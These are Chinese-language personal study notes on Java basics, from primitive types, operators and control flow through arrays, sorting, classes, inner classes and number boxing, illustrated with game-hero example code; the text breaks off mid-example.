2.变量java中有八种基本类型，这八种都是关键字，在设置变量时不能够用这些关键字。 这八种分别是： 整型 （4种）字符型 （1种）浮点型 （2种）布尔型（1种） 1.整型 类型 缺省值 长度 范围 byte 0 8 -128~127 short 0 16 -32768~32767 int 0 32 -2147483648~2147483647 long 0 64 -9223372036854~9223372036854 2.字符型char 类型用于存放一个字符，值用单引号表示（双引号表示字符串） 3.浮点型注意： 默认的小数值是double类型的所以 float f &#x3D; 54.321会出现编译错误，因为54.321的默认类型是 double，其类型 长度为64，超过了float的长度32在数字后面加一个字母f，直接把该数字声明成float类型float f2 &#x3D; 54.321f, 4.布尔型布尔型表示真假，其长度为1 true false 5.Sting字面型：public class HelloWorld &#123; public static void main(String[] args) &#123; String name = &quot;盖伦&quot;; char a= &#x27;c&#x27;; //以下是转义字符 char tab = &#x27;\\t&#x27;; //制表符 char carriageReturn = &#x27;\\r&#x27;; //回车 char newLine = &#x27;\\n&#x27;; //换行 char doubleQuote = &#x27;\\&quot;&#x27;; //双引号 char singleQuote = &#x27;\\&#x27;&#x27;; //单引号 char backslash = &#x27;\\\\&#x27;; //反斜杠 类型转换规则：从小到大自动转，从大到小强制转 作用域如果一个变量，是声明在一个方法上的，就叫做参数参数的作用域即为该方法内的所有代码其他方法不能访问该参数类里面也不能访问该参数 声明在方法内的变量，叫做局部变量其作用域在声明开始的位置，到其所处于的块结束位置 final准确的描述是 当一个变量被final修饰的时候，该变量只有一次赋值的机会 3.操作符scanner操作符（向控制台输入数据） import java.util.Scanner; public class HelloWorld &#123; public static void main(String[] args) &#123; Scanner s = new Scanner(System.in); float a = s.nextFloat(); System.out.println(&quot;读取的浮点数的值是：&quot;+a); &#125;&#125;import java.util.Scanner;Scanner s = new Scanner(System.in); 要先引用。 字符串时LIne 注意：需要注意的是，如果在通过nextInt()读取了整数后，再接着读取字符串，读出来的是回车换行:”\\r\\n”,因为nextInt仅仅读取数字信息，而不会读取回车换行”\\r\\n”. 所以，如果在业务上需要读取了整数后，接着读取字符串，那么就应该连续执行两次nextLine()，第一次是取走回车换行，第二次才是读取真正的字符串import java.util.Scanner; import java.util.Scanner; public class HelloWorld &#123; public static void main(String[] args) &#123; Scanner s = new Scanner(System.in); int i = s.nextInt(); System.out.println(&quot;读取的整数是&quot;+ i); String rn = s.nextLine(); String a = s.nextLine(); System.out.println(&quot;读取的字符串是：&quot;+a); &#125;&#125; 算数如果任何运算单元的长度都不超过int,那么运算结果就按照int来计算 public class HelloWorld &#123; public static void main(String[] args) &#123; byte a = 1; byte b= 2; byte c = (byte) (a+b); //虽然a b都是byte类型，但是运算结果是int类型，需要进行强制转换 int d = a+b; &#125;&#125; 逻辑运算符&amp;&amp;与&amp; 无论长路与还是短路与两边的运算单元都是布尔值都为真时，才为真任意为假，就为假区别长路与 两侧，都会被运算短路与 只要第一个是false，第二个就不进行运算了 ||与| 无论长路或还是短路或两边的运算单元都是布尔值都为假时，才为假任意为真，就为真区别长路或 两侧都会被运算短路或 只要第一个是true的，第二个就不进行运算了 ！ 取反!真变为假假变为真 ^ 异或^不同，返回真相同，返回假 位操作符 Integer.toBinaryString() 一个整数的二进制表达 示例代码 | 位或 示例代码 &amp; 位与 示例代码 ^ 异或 示例代码 ~ 取非 示例代码 &lt;&lt; &gt;&gt; 左移 右移 位或5的二进制是1016的二进制是110所以 5|6 对每一位进行或运算，得到 111-&gt;7 位与5的二进制是1016的二进制是110所以 5&amp;6 对每一位进行与运算，得到 100-&gt;4 异或5的二进制是1016的二进制是110所以 5^6 对每一位进行异或运算，得到 011-&gt;3 一些特别情况：任何数和自己进行异或 都等于 0任何数和0 进行异或 都等于自己 取非5 的二进制是 00000101所以取反即为 11111010这个二进制换算成十进制即为-6 左移右移左移：根据一个整数的二进制表达，将其每一位都向左移动，最右边一位补0右移：根据一个整数的二进制表达，将其每一位都向右移动 java三元操作符表达式?值1:值2如果表达式为真 返回值1如果表达式为假 返回值2 4.java控制流程if语句if(表达式1)&#123; 表达式2；&#125; //如果有多个表达式，必须用大括弧包括起来//如果只有一个表达式可以不用写括弧，看上去会简约一些 if else语句public class HelloWorld &#123; public static void main(String[] args) &#123; boolean b = false; if (b) System.out.println(&quot;yes&quot;); else System.out.println(&quot;no&quot;); &#125;&#125; else if 是多条件判断public class HelloWorld &#123; public static void main(String[] args) &#123; //如果只使用 if,会执行4次判断 int i = 2; if (i==1) System.out.println(1); if (i==2) System.out.println(2); if (i==3) System.out.println(3); if (i==4) System.out.println(4); //如果使用else if, 一旦在18行，判断成立， 20行和22行的判断就不会执行了，节约了运算资源 if (i==1) System.out.println(1); else if (i==2) System.out.println(2); else if (i==3) System.out.println(3); else if (i==4) System.out.println(4); &#125;&#125; swich语句switch可以使用byte,short,int,char,String,enum 注: 每个表达式结束，都应该有一个break;注: String在Java1.7之前是不支持的, Java从1.7开始支持switch用String的，编译后是把String转化为hash值，其实还是整数 while和do while循环 while 条件为true时 重复执行 示例代码 do while 条件为true时 重复执行，至少会执行一次 for循环和c语言一样 for for (int j = 0; j &lt; 10; j++) continue继续进行下一次循环 结束循环结束当前循环：break使用boolean变量结束外部循环public class HelloWorld &#123; public static void main(String[] args) &#123; boolean breakout = false; //是否终止外部循环的标记 for (int i = 0; i &lt; 10; i++) &#123; for (int j = 0; j &lt; 10; j++) &#123; System.out.println(i + &quot;:&quot; + j); if (0 == j % 2) &#123; breakout = true; //终止外部循环的标记设置为true break; &#125; &#125; if (breakout) //判断是否终止外部循环 break; &#125; &#125;&#125; 使用标签结束外部循环public class HelloWorld &#123; public static void main(String[] args) &#123; //打印单数 outloop: //outloop这个标示是可以自定义的比如outloop1,ol2,out5 for (int i = 0; i &lt; 10; i++) &#123; for (int j = 0; j &lt; 10; j++) &#123; System.out.println(i+&quot;:&quot;+j); if(0==j%2) break outloop; //如果是双数，结束外部循环 &#125; &#125; &#125;&#125; 5.数组声明数组-创建数组public class HelloWorld &#123; public static void main(String[] args) &#123; //声明一个引用 int[] a; //创建一个长度是5的数组，并且使用引用a指向该数组 a = new int[5]; int[] b = new int[5]; //声明的同时，指向一个数组 &#125;&#125; 数组的第一个数是从0开始的，**.length属性**用于访问一个数组的长度数组访问下标范围是0到长度-1一旦超过这个范围,就会产生数组下标越界异常 public class HelloWorld &#123; public static void main(String[] args) &#123; int[] a; a = new int[5]; System.out.println(a.length); //打印数组的长度 a[4]=100; //下标4，实质上是“第5个”，即最后一个 a[5]=101; //下标5，实质上是“第6个”，超出范围 ,产生数组下标越界异常 &#125;&#125; 随机获得整数 (int) (Math.random() * 100) 初始化数组作为int类型的数组，默认值是0 public class HelloWorld &#123; public static void main(String[] args) &#123; //写法一： 分配空间同时赋值 int[] a = new int[]&#123;100,102,444,836,3236&#125;; //写法二： 省略了new int[],效果一样 int[] b = &#123;100,102,444,836,3236&#125;; //写法三：同时分配空间，和指定内容 //在这个例子里，长度是3，内容是5个，产生矛盾了 //所以如果指定了数组的内容，就不能同时设置数组的长度 int[] c = new int[3]&#123;100,102,444,836,3236&#125;; &#125;&#125; 排序选择排序public class HelloWorld &#123; public static void main(String[] args) &#123; int a [] = new int[]&#123;18,62,68,82,65,9&#125;; //排序前，先把内容打印出来 for (int i = 0; i &lt; a.length; i++) &#123; System.out.print(a[i] + &quot; &quot;); &#125; System.out.println(&quot; &quot;); //选择法排序 //第一步： 把第一位和其他所有位进行比较 //如果发现其他位置的数据比第一位小，就进行交换 for (int i = 1; i &lt; a.length; i++) &#123; if(a[i]&lt;a[0])&#123; int temp = a[0]; a[0] = a[i]; a[i] = temp; &#125; &#125; //把内容打印出来 //可以发现，最小的一个数，到了最前面 for (int i = 0; i &lt; a.length; i++) &#123; System.out.print(a[i] + &quot; &quot;); &#125; System.out.println(&quot; &quot;); //第二步： 把第二位的和剩下的所有位进行比较 for (int i = 2; i &lt; a.length; i++) &#123; if(a[i]&lt;a[1])&#123; int temp = a[1]; a[1] = a[i]; a[i] = temp; &#125; &#125; //把内容打印出来 //可以发现，倒数第二小的数，到了第二个位置 for (int i = 0; i &lt; a.length; i++) &#123; System.out.print(a[i] + &quot; &quot;); &#125; System.out.println(&quot; &quot;); //可以发现一个规律 //移动的位置是从0 逐渐增加的 //所以可以在外面套一层循环 for (int j = 0; j &lt; a.length-1; j++) &#123; for (int i = j+1; i &lt; a.length; i++) &#123; if(a[i]&lt;a[j])&#123; int temp = a[j]; a[j] = a[i]; a[i] = temp; &#125; &#125; &#125; //把内容打印出来 for (int i = 0; i &lt; a.length; i++) &#123; System.out.print(a[i] + &quot; &quot;); &#125; System.out.println(&quot; &quot;); &#125;&#125; 冒泡排序public class HelloWorld &#123; public static void main(String[] args) &#123; int a [] = new int[]&#123;18,62,68,82,65,9&#125;; //排序前，先把内容打印出来 for (int i = 0; i &lt; a.length; i++) &#123; System.out.print(a[i] + &quot; &quot;); &#125; System.out.println(&quot; &quot;); //冒泡法排序 //第一步：从第一位开始，把相邻两位进行比较 //如果发现前面的比后面的大，就把大的数据交换在后面 for (int i = 0; i &lt; a.length-1; i++) &#123; if(a[i]&gt;a[i+1])&#123; int temp = a[i]; a[i] = a[i+1]; a[i+1] = temp; &#125; &#125; //把内容打印出来 //可以发现，最大的到了最后面 for (int i = 0; i &lt; a.length; i++) &#123; System.out.print(a[i] + &quot; &quot;); &#125; System.out.println(&quot; &quot;); //第二步： 再来一次，只不过不用比较最后一位 for (int i = 0; i &lt; a.length-2; i++) &#123; if(a[i]&gt;a[i+1])&#123; int temp = a[i]; a[i] = a[i+1]; a[i+1] = temp; &#125; &#125; //把内容打印出来 //可以发现，倒数第二大的到了倒数第二个位置 for (int i = 0; i &lt; a.length; i++) &#123; System.out.print(a[i] + &quot; &quot;); &#125; System.out.println(&quot; &quot;); //可以发现一个规律 //后边界在收缩 //所以可以在外面套一层循环 for (int j = 0; j &lt; a.length; j++) &#123; for (int i = 0; i &lt; a.length-j-1; i++) &#123; if(a[i]&gt;a[i+1])&#123; int temp = a[i]; a[i] = a[i+1]; a[i+1] = temp; &#125; &#125; &#125; //把内容打印出来 for (int i = 0; i &lt; a.length; i++) &#123; System.out.print(a[i] + &quot; &quot;); &#125; System.out.println(&quot; &quot;); &#125;&#125; 增强型for循环注：增强型for循环只能用来取值，却不能用来修改数组里的值 public class HelloWorld &#123; public static void main(String[] args) &#123; int values [] = new int[]&#123;18,62,68,82,65,9&#125;; //常规遍历 for (int i = 0; i &lt; values.length; i++) &#123; int each = values[i]; System.out.println(each); &#125; //增强型for循环遍历 for (int each : values) &#123; System.out.println(each); &#125; &#125;&#125; 复制数组把一个数组的值，复制到另一个数组中 System.arraycopy(src, srcPos, dest, destPos, length)src: 源数组srcPos: 从源数组复制数据的起始位置dest: 目标数组destPos: 复制到目标数组的起始位置length: 复制的长度 public class HelloWorld &#123; public static void main(String[] args) &#123; int a [] = new int[]&#123;18,62,68,82,65,9&#125;; int b[] = new int[3];//分配了长度是3的空间，但是没有赋值 //通过数组赋值把，a数组的前3位赋值到b数组 //方法一： for循环 for (int i = 0; i &lt; b.length; i++) &#123; b[i] = a[i]; &#125; //方法二: System.arraycopy(src, srcPos, dest, destPos, length) //src: 源数组 //srcPos: 从源数组复制数据的起始位置 //dest: 目标数组 //destPos: 复制到目标数组的启始位置 //length: 复制的长度 System.arraycopy(a, 0, b, 0, 3); //把内容打印出来 for (int i = 0; i &lt; b.length; i++) &#123; System.out.print(b[i] + &quot; &quot;); &#125; &#125;&#125; 练习复制数组： import javax.management.MXBean;import java.util.Arrays;public class Arrs &#123; public static void main(String[] args) &#123; int [] arr_0; int [] arr_1; while (true) &#123; int temp = (int) (Math.random() * 10) + 1; if (temp &gt;5 &amp;&amp; temp &lt; 10) &#123; arr_0 = new int[temp]; break; &#125; &#125; while (true) &#123; int temp = (int) (Math.random() * 10) + 1; if (temp &gt;5 &amp;&amp; temp &lt; 10) &#123; arr_1 = new int[temp]; break; &#125; &#125; for (int i = 0; i &lt; arr_0.length; i++) arr_0[i] = (int) (Math.random() * 100) + 1; for (int i = 0; i &lt; arr_0.length; i++) arr_1[i] = (int) (Math.random() * 100) + 1; int [] new_arr = new int[arr_0.length + arr_1.length]; System.arraycopy(arr_0,0,new_arr,0,arr_0.length); System.arraycopy(arr_1,0,new_arr,arr_0.length,arr_1.length); System.out.println(arr_0.length); System.out.println(arr_1.length); System.out.println(Arrays.toString(arr_0)); System.out.println(Arrays.toString(arr_1)); System.out.println(Arrays.toString(new_arr)); System.out.println(&quot;Done&quot;); &#125;&#125; 二维数组这是一个二维数组，里面的每一个元素，都是一个一维数组所以二维数组又叫数组的数组。 int b[][] = new int[][]&#123; &#123;1,2,3&#125;, &#123;4,5,6&#125;, &#123;7,8,9&#125;&#125;; 初始化二维数组 public class HelloWorld &#123; public static void main(String[] args) &#123; //初始化二维数组， int[][] a = new int[2][3]; //有两个一维数组，每个一维数组的长度是3 a[1][2] = 5; //可以直接访问一维数组，因为已经分配了空间 //只分配了二维数组 int[][] b = new int[2][]; //有两个一维数组，每个一维数组的长度暂未分配 b[0] =new int[3]; //必须事先分配长度，才可以访问 b[0][2] = 5; //指定内容的同时，分配空间 int[][] c = new int[][]&#123; &#123;1,2,4&#125;, &#123;4,5&#125;, &#123;6,7,8,9&#125; &#125;; &#125;&#125; Arrays 关键字 简介 示例代码 copyOfRange 数组复制 示例代码 toString() 转换为字符串 示例代码 sort 排序 示例代码 binarySearch 搜索 示例代码 equals 判断是否相同 示例代码 fill 填充 数组复制 System.arraycopy，需要事先准备好目标数组，并分配长度。 copyOfRange 只需要源数组就就可以了，通过返回值，就能够得到目标数组了。除此之外，需要注意的是 copyOfRange 的第3个参数，表示源数组的结束位置，是取不到的。 import java.util.Arrays; public class HelloWorld &#123; public static void main(String[] args) &#123; int a[] = new int[] &#123; 18, 62, 68, 82, 65, 9 &#125;; // copyOfRange(int[] original, int from, int to) // 第一个参数表示源数组 // 第二个参数表示开始位置(取得到) // 第三个参数表示结束位置(取不到) int[] b = Arrays.copyOfRange(a, 0, 3); for (int i = 0; i &lt; b.length; i++) &#123; System.out.print(b[i] + &quot; &quot;); &#125; &#125;&#125; 转换为字符串 Arrays提供了一个toString()方法，直接把一个数组，转换为字符串，这样方便观察数组的内容 import java.util.Arrays; public class HelloWorld &#123; public static void main(String[] args) &#123; int a[] = new int[] &#123; 18, 62, 68, 82, 65, 9 &#125;; String content = Arrays.toString(a); System.out.println(content); &#125;&#125; 排序 import java.util.Arrays; public class HelloWorld &#123; public static void main(String[] args) &#123; int a[] = new int[] &#123; 18, 62, 68, 82, 65, 9 &#125;; System.out.println(&quot;排序之前 :&quot;); System.out.println(Arrays.toString(a)); Arrays.sort(a); System.out.println(&quot;排序之后:&quot;); System.out.println(Arrays.toString(a)); &#125;&#125; 搜索 需要注意的是，使用binarySearch进行查找之前，必须使用sort进行排序如果数组中有多个相同的元素，查找结果是不确定的 import java.util.Arrays; public class HelloWorld &#123; public static void main(String[] args) &#123; int a[] = new int[] &#123; 18, 62, 68, 82, 65, 9 &#125;; Arrays.sort(a); System.out.println(Arrays.toString(a)); //使用binarySearch之前，必须先使用sort进行排序 System.out.println(&quot;数字 62出现的位置:&quot;+Arrays.binarySearch(a, 62)); &#125;&#125; 判断是否相同 import java.util.Arrays; public class HelloWorld &#123; public static void main(String[] args) &#123; int a[] = new int[] &#123; 18, 62, 68, 82, 65, 9 &#125;; int b[] = new int[] &#123; 18, 62, 68, 82, 65, 8 &#125;; System.out.println(Arrays.equals(a, b)); &#125;&#125; 填充 使用同一个值，填充整个数组 import java.util.Arrays; public class HelloWorld &#123; public static void main(String[] args) &#123; int a[] = new int[10]; Arrays.fill(a, 5); System.out.println(Arrays.toString(a)); &#125;&#125; 6.类和对象引用引用的概念，如果一个变量的类型是 类类型，而非基本类型，那么该变量又叫做引用。 Hero h = new Hero(); h这个变量是Hero类型，又叫做引用&#x3D;的意思指的h这个引用代表右侧创建的对象“代表” 在面向对象里，又叫做“指向” 引用有多个，但是对象只有一个。在这个例子里，所有引用都指向了同一个对象。对象就像 “房产”， 引用就像”房产证”房产证的复印件可以有多张，但是真正的”房产” 只有这么一处 一个引用，多个对象时，只有最后一个能成功指向 继承public class Weapon extends Item&#123; int damage; //攻击力 public static void main(String[] args) &#123; Weapon infinityEdge = new Weapon(); infinityEdge.damage = 65; //damage属性在类Weapon中新设计的 infinityEdge.name = &quot;无尽之刃&quot;;//name属性，是从Item中继承来的，就不需要重复设计了 infinityEdge.price = 3600; &#125; &#125; 通过继承别的类的属性，不需要重复设计。 方法重载方法名是一样的，但是参数类型不一样在调用方法attack的时候，会根据传递的参数类型以及数量，自动调用对应的方法 public class ADHero extends Hero &#123; public void attack() &#123; System.out.println(name + &quot; 进行了一次攻击 ，但是不确定打中谁了&quot;); &#125; public void attack(Hero h1) &#123; System.out.println(name + &quot;对&quot; + h1.name + &quot;进行了一次攻击 &quot;); &#125; public void attack(Hero h1, Hero h2) &#123; System.out.println(name + &quot;同时对&quot; + h1.name + &quot;和&quot; + h2.name + &quot;进行了攻击 &quot;); &#125; public static void main(String[] args) &#123; ADHero bh = new ADHero(); bh.name = &quot;赏金猎人&quot;; Hero h1 = new Hero(); h1.name = &quot;盖伦&quot;; Hero h2 = new Hero(); h2.name = &quot;提莫&quot;; bh.attack(h1); bh.attack(h1, h2); &#125; &#125; 构造方法方法名和类名一样（包括大小写）没有返回类型实例化一个对象的时候，必然调用构造方法 一旦提供了一个有参的构造方法同时又没有显式的提供一个无参的构造方法那么默认的无参的构造方法，就“木有了“ thisthis即代表当前对象 //直接打印对象，会显示该对象在内存中的虚拟地址 ``//格式：Hero@c17164 c17164即虚拟地址，每次执行，得到的地址不一定一样 而调用行为则出现相同的地址 属性名和变量名不能一样 参数名不得不使用其他变量名 用this即可解决问题 public class Hero &#123; String name; //姓名 float hp; //血量 float armor; //护甲 int moveSpeed; //移动速度 //参数名和属性名一样 //在方法体中，只能访问到参数name public void setName1(String name)&#123; name = name; &#125; //为了避免setName1中的问题，参数名不得不使用其他变量名 public void setName2(String heroName)&#123; name = heroName; &#125; //通过this访问属性 public void setName3(String name)&#123; //name代表的是参数name //this.name代表的是属性name this.name = name; &#125; public static void main(String[] args) &#123; Hero h =new Hero(); h.setName1(&quot;teemo&quot;); System.out.println(h.name); h.setName2(&quot;garen&quot;); System.out.println(h.name); h.setName3(&quot;死歌&quot;); System.out.println(h.name); &#125; &#125; 传参传参分为基本类型传参和类类型传参 基本： 基本类型传参在方法内，无法修改方法外的基本类型参数 public class Hero &#123; String name; //姓名 float hp; //血量 float armor; //护甲 int moveSpeed; //移动速度 public Hero()&#123; &#125; //回血 public void huixue(int xp)&#123; hp = hp + xp; //回血完毕后，血瓶=0 xp=0; &#125; public Hero(String name,float hp)&#123; this.name = name; this.hp = hp; &#125; public static void main(String[] args) &#123; Hero teemo = new Hero(&quot;提莫&quot;,383); //血瓶，其值是100 int xueping = 100; //提莫通过这个血瓶回血 teemo.huixue(xueping); System.out.println(xueping); &#125; &#125; 引用和&#x3D; 果一个变量是基本类型比如 int hp &#x3D; 50;我们就直接管hp叫变量&#x3D;表示赋值的意思。如果一个变量是类类型比如 Hero h &#x3D; new Hero();我们就管h叫做引用。&#x3D;不再是赋值的意思&#x3D;表示指向的意思比如 Hero h &#x3D; new Hero();这句话的意思是引用h，指向一个Hero对象 类类型传参： 类类型又叫引用第24行的引用 teemo与 第17行的引用hero，是不同的引用通过调用garen.attack(teemo, 100); 使得这两个引用都指向了同一个对象所以在第18行hero.hp &#x3D; hero.hp - damage; 就使得该对象的hp值，发生了变化因此第25行，打印该对象的Hp值就是变化后的值 public class Hero &#123; String name; // 姓名 float hp; // 血量 float armor; // 护甲 int moveSpeed; // 移动速度 public Hero(String name, float hp) &#123; this.name = name; this.hp = hp; &#125; // 攻击一个英雄，并让他掉damage点血 public void attack(Hero hero, int damage) &#123; hero.hp = hero.hp - damage; &#125; public static void main(String[] args) &#123; Hero teemo = new Hero(&quot;提莫&quot;, 383); Hero garen = new Hero(&quot;盖伦&quot;, 616); garen.attack(teemo, 100); System.out.println(teemo.hp); &#125; &#125; 包package 把比较接近的类，规划在同一个包下 在最开始的地方声明该类所处于的包名 使用同一个包下的其他类，直接使用即可但是要使用其他包下的类，必须import package charactor; //Weapon类在其他包里，使用必须进行importimport property.Weapon; public class Hero &#123; String name; //姓名 float hp; //血量 float armor; //护甲 int moveSpeed; //移动速度 //装备一把武器 public void equip(Weapon w)&#123; &#125; &#125; 访问修饰符成员变量有四种修饰符 private 私有的package&#x2F;friendly&#x2F;default 不写protected 受保护的public 公共的 类之间的关系 自身：指的是Hero自己同包子类：ADHero这个类是Hero的子类，并且和Hero处于同一个包下不同包子类：Support这个类是Hero的子类，但是在另一个包下同包类： GiantDragon 这个类和Hero是同一个包，但是彼此没有继承关系其他类：Item这个类，在不同包，也没有继承关系的类 类属性当一个属性被static修饰的时候，就叫做类属性，又叫做静态属性当一个属性被声明成类属性，那么所有的对象，都共享一个值与对象属性对比：不同对象的 对象属性 的值都可能不一样。比如盖伦的hp 和 提莫的hp 是不一样的。但是所有对象的类属性的值，都是一样的 如果一个属性声明成类属性，那么所有的对象，都共享这么一个值 所以类属性是可以被用作所有对象都一致的 类方法类方法： 又叫做静态方法 对象方法： 又叫实例方法，非静态方法 访问一个对象方法，必须建立在有一个对象的前提的基础上访问类方法，不需要对象的存在，直接就访问 package charactor; public class Hero &#123; public String name; protected float hp; //实例方法,对象方法，非静态方法 //必须有对象才能够调用 public void die()&#123; hp = 0; &#125; //类方法，静态方法 //通过类就可以直接调用 public static void battleWin()&#123; System.out.println(&quot;battle win&quot;); &#125; public static void main(String[] args) &#123; Hero garen = new Hero(); garen.name = &quot;盖伦&quot;; //必须有一个对象才能调用 garen.die(); Hero teemo = new Hero(); teemo.name = &quot;提莫&quot;; //无需对象，直接通过类调用 Hero.battleWin(); &#125;&#125; 单例模式package charactor; public class GiantDragon &#123; //私有化构造方法使得该类无法在外部通过new 进行实例化 private GiantDragon()&#123; &#125; //准备一个类属性，指向一个实例化对象。 因为是类属性，所以只有一个 private static GiantDragon instance = new GiantDragon(); //public static 方法，提供给调用者获取12行定义的对象 public static GiantDragon getInstance()&#123; return instance; &#125; &#125; 枚举枚举enum是一种特殊的类(还是类)，使用枚举可以很方便的定义常 public class HelloWorld &#123; public static void main(String[] args) &#123; Season season = Season.SPRING; switch (season) &#123; case SPRING: System.out.println(&quot;春天&quot;); break; case SUMMER: System.out.println(&quot;夏天&quot;); break; case AUTUMN: System.out.println(&quot;秋天&quot;); break; case WINTER: System.out.println(&quot;冬天&quot;); break; &#125; &#125;&#125;枚举enum是一种特殊的类(还是类)，使用枚举可以很方便的定义常 public enum Season &#123; SPRING,SUMMER,AUTUMN,WINTER&#125; 7.接口和继承super实例化子类，父类的构造方法一定会被调用 其父类的构造方法也会被调用并且是父类构造方法先调用子类构造方法会默认调用父类的 无参的构造方法 父类显式提供两个构造方法 分别是无参的构造方法和带一个参数的构造方法 使用关键字super 显式调用父类带参的构造方法 object声明一个类的时候，默认是继承了Objectpublic class Hero extends Object,object是所有类的父类 Object类提供一个toString方法，所以所有的类都有toString方法toString()的意思是返回当前对象的字符串表达 通过 System.out.println 打印对象就是打印该对象的toString()返回值 当一个对象没有任何引用指向的时候，它就满足垃圾回收的条件 当它被垃圾回收的时候，它的finalize() 方法就会被调用。 package charactor; public class Hero &#123; public String name; protected float hp; public String toString()&#123; return name; &#125; public void finalize()&#123; System.out.println(&quot;这个英雄正在被回收&quot;); &#125; public static void main(String[] args) &#123; //只有一引用 Hero h; for (int i = 0; i &lt; 100000; i++) &#123; //不断生成新的对象 //每创建一个对象，前一个对象，就没有引用指向了 //那些对象，就满足垃圾回收的条件 //当，垃圾堆积的比较多的时候，就会触发垃圾回收 //一旦这个对象被回收，它的finalize()方法就会被调用 h = new Hero(); &#125; &#125;&#125; equals() 用于判断两个对象的内容是否相同package charactor; public class Hero &#123; public String name; protected float hp; public boolean equals(Object o)&#123; if(o instanceof Hero)&#123; Hero h = (Hero) o; return this.hp == h.hp; &#125; return false; &#125; public static void main(String[] args) &#123; Hero h1= new Hero(); h1.hp = 300; Hero h2= new Hero(); h2.hp = 400; Hero h3= new Hero(); h3.hp = 300; System.out.println(h1.equals(h2)); System.out.println(h1.equals(h3)); &#125;&#125; &#x3D;&#x3D;用于判断两个引用，是否指向了同一个对象 hashcodehashCode方法返回一个对象的哈希值 final当Hero被修饰成final的时候，表示Hero不能够被继承 Hero的useItem方法被修饰成final,那么该方法在ADHero中，不能够被重写 final修饰基本类型变量，表示该变量只有一次赋值机会 inal修饰引用h引用被修饰成final，表示该引用只有1次指向对象的机会所以17行会出现编译错误但是，依然通过h引用修改对象的属性值hp，因为hp并没有final修饰 抽象类在类中声明一个方法，这个方法没有实现体，是一个“空”方法 这样的方法就叫抽象方法，使用修饰符“abstract” 当一个类有抽象方法的时候，该类必须被声明为抽象类 package charactor; public abstract class Hero &#123; String name; float hp; float armor; int moveSpeed; public static void main(String[] args) &#123; &#125; // 抽象方法attack // Hero的子类会被要求实现attack方法 public abstract void attack(); &#125; package charactor; public class ADHero extends Hero implements AD &#123; public void physicAttack() &#123; System.out.println(&quot;进行物理攻击&quot;); &#125; @Override public void attack() &#123; physicAttack(); &#125; &#125; Hero类可以在不提供抽象方法的前提下，声明为抽象类一旦一个类被声明为抽象类，就不能够被直接实例化 区别1：子类只能继承一个抽象类，不能继承多个子类可以实现多个接口区别2：抽象类可以定义public,protected,package,private静态和非静态属性final和非final属性但是接口中声明的属性，只能是public静态final的即便没有显式的声明 内部类内部类分为四种：非静态内部类静态内部类匿名类本地类 非静态内部类package charactor; public class Hero &#123; private String name; // 姓名 float hp; // 血量 float armor; // 护甲 int moveSpeed; // 移动速度 // 非静态内部类，只有一个外部类对象存在的时候，才有意义 // 战斗成绩只有在一个英雄对象存在的时候才有意义 class BattleScore &#123; int kill; int die; int assit; public void legendary() &#123; if (kill &gt;= 8) System.out.println(name + &quot;超神！&quot;); else System.out.println(name + &quot;尚未超神！&quot;); &#125; &#125; public static void main(String[] args) &#123; Hero garen = new Hero(); garen.name = &quot;盖伦&quot;; // 实例化内部类 // BattleScore对象只有在一个英雄对象存在的时候才有意义 // 所以其实例化必须建立在一个外部类对象的基础之上 BattleScore score = garen.new BattleScore(); score.kill = 9; score.legendary(); &#125; &#125; 静态内部类package charactor; public class Hero &#123; public String name; protected float hp; private static void battleWin()&#123; System.out.println(&quot;battle win&quot;); &#125; //敌方的水晶 static class EnemyCrystal&#123; int hp=5000; //如果水晶的血量为0，则宣布胜利 public void checkIfVictory()&#123; if(hp==0)&#123; Hero.battleWin(); //静态内部类不能直接访问外部类的对象属性 System.out.println(name + &quot; win this game&quot;); &#125; &#125; &#125; public static void main(String[] args) &#123; //实例化静态内部类 Hero.EnemyCrystal crystal = new Hero.EnemyCrystal(); crystal.checkIfVictory(); &#125; &#125; 在一个类里面声明一个静态内部类比如敌方水晶，当敌方水晶没有血的时候，己方所有英雄都取得胜利，而不只是某一个具体的英雄取得胜利。与非静态内部类不同，静态内部类水晶类的实例化 不需要一个外部类的实例为基础，可以直接实例化语法：new 外部类.静态内部类();因为没有一个外部类的实例，所以在静态内部类里面不可以访问外部类的实例属性和方法除了可以访问外部类的私有静态成员外，静态内部类和普通类没什么大的区别 匿名类匿名类指的是在声明一个类的同时实例化它，使代码更加简洁精练通常情况下，要使用一个接口或者抽象类，都必须创建一个子类 有的时候，为了快速使用，直接实例化一个抽象类，并“当场”实现其抽象方法。既然实现了抽象方法，那么就是一个新的类，只是这个类，没有命名。这样的类，叫做匿名类 package charactor; public abstract class Hero &#123; String name; //姓名 float hp; //血量 float armor; //护甲 int moveSpeed; //移动速度 public abstract void attack(); public static void main(String[] args) &#123; ADHero adh=new ADHero(); //通过打印adh，可以看到adh这个对象属于ADHero类 adh.attack(); System.out.println(adh); Hero h = new Hero()&#123; //当场实现attack方法 public void attack() &#123; System.out.println(&quot;新的进攻手段&quot;); &#125; &#125;; h.attack(); //通过打印h，可以看到h这个对象属于Hero$1这么一个系统自动分配的类名 System.out.println(h); &#125; &#125; 本地类本地类可以理解为有名字的匿名类内部类与匿名类不一样的是，内部类必须声明在成员的位置，即与属性和方法平等的位置。本地类和匿名类一样，直接声明在代码块里面，可以是主方法，for循环里等等地方 package charactor; public abstract class Hero &#123; String name; //姓名 float hp; //血量 float armor; //护甲 int moveSpeed; //移动速度 public abstract void attack(); public static void main(String[] args) &#123; //与匿名类的区别在于，本地类有了自定义的类名 class SomeHero extends Hero&#123; public void attack() &#123; System.out.println( name+ &quot; 新的进攻手段&quot;); &#125; &#125; SomeHero h =new SomeHero(); h.name =&quot;地卜师&quot;; h.attack(); &#125; &#125; 默认方法默认方法是JDK8新特性，指的是接口也可以提供具体方法了，而不像以前，只能提供抽象方法. 8.数字和字符串数字封装类数字封装类有Byte,Short,Integer,Long,Float,Double这些类都是抽象类Number的子类 不需要调用构造方法，通过&#x3D;符号****自动把 基本类型 转换为 类类型 就叫装箱 package digit; public class TestNumber &#123; public static void main(String[] args) &#123; int i = 5; //基本类型转换成封装类型 Integer it = new Integer(i); //自动转换就叫装箱 Integer it2 = i; &#125;&#125; 不需要调用Integer的intValue方法，通过&#x3D;就自动转换成int类型，就叫拆箱 package digit; public class TestNumber &#123; public static void main(String[] args) &#123; int i = 5; Integer it = new Integer(i); //封装类型转换成基本类型 int i2 = it.intValue(); //自动转换就叫拆箱 int i3 = it; &#125;&#125; nt的最大值可以通过其对应的封装类Integer.MAX_VALUE获取 字符串数字转字符串：方法1： 使用String类的静态方法valueOf方法2： 先把基本类型装箱为对象，然后调用对象的toString package digit; public class TestNumber &#123; public static void main(String[] args) &#123; int i = 5; //方法1 String str = 